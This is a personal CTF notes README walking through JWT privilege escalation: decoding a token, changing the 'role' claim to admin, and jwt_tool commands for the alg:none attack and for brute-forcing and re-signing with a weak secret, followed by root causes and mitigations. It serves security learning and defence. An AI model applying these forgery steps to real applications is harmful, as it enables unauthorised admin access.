# 🛡️ CTF Notes Repository – JWT Privilege Escalation

## 📌 Project Purpose

This repository contains my structured Capture The Flag (CTF) solutions and security research notes.

The goal of this project is to:

- 📚 Document practical exploitation techniques
- 🧠 Strengthen understanding of real-world vulnerabilities
- 🔍 Break down misconfigurations in authentication mechanisms
- 🛠 Build a personal offensive security knowledge base
- 🚀 Track learning progress for red teaming and VAPT

Each solution focuses not just on exploitation, but also on:

- Root cause analysis
- Security impact
- Defensive mitigation strategies

---

## 📂 CTF Solutions Index

- [JWT Role Escalation via Token Tampering](#-jwt-role-escalation-via-token-tampering)

---

# 🔐 JWT Role Escalation via Token Tampering

## 🎯 Objective

Escalate privileges by modifying the JWT `role` claim from:

```json
"role": "user"
```

to:

```json
"role": "admin"
```

---

## 🔎 Step 1: Capture the JWT

After authentication, the application returns a JWT.

The token may be found in:

- `Authorization: Bearer <token>`
- Cookies
- LocalStorage

### Example Token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.
<signature>
```

---

## 🧠 Step 2: Decode the Token

### Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload

```json
{
  "username": "guest",
  "role": "user"
}
```

### ⚠️ Observation

- JWT is base64 encoded, not encrypted.
- Role-based access control depends entirely on the `role` claim.

---

## 🛠 Step 3: Tamper Using jwt_tool

### 🔹 Interactive Mode

```bash
python3 jwt_tool.py <JWT> -I
```

Modify the payload:

```json
{
  "username": "guest",
  "role": "admin"
}
```

---

### 🔹 Exploit `alg: none` (If Accepted)

```bash
python3 jwt_tool.py <JWT> -X n
```

If the server does not validate signatures properly, this generates an unsigned token.

---

### 🔹 Brute Force Weak Secret (If Needed)

```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

After identifying the secret:

```bash
python3 jwt_tool.py <JWT> -S <secret>
```

---

## 🔁 Step 4: Replace the Token

Insert the modified token into:

- Authorization header
- Cookie storage
- Browser LocalStorage

Resend the request.

---

## ✅ Result

- Access to admin functionality granted
- Privilege escalation successful
- Flag retrieved

---

## 🔍 Root Cause

- Improper JWT signature validation
- Weak or guessable secret key
- Blind trust in client-controlled claims
- Failure to enforce server-side authorization checks

---

## 🛡 Mitigation

- Enforce strict signature verification
- Use strong random secrets
- Reject `alg: none`
- Implement server-side role validation
- Apply principle of least privilege

---

## 📌 Key Takeaways

- JWT ≠ Encryption
- Never trust client-side data
- Always validate signatures
- Authorization must not rely solely on token claims
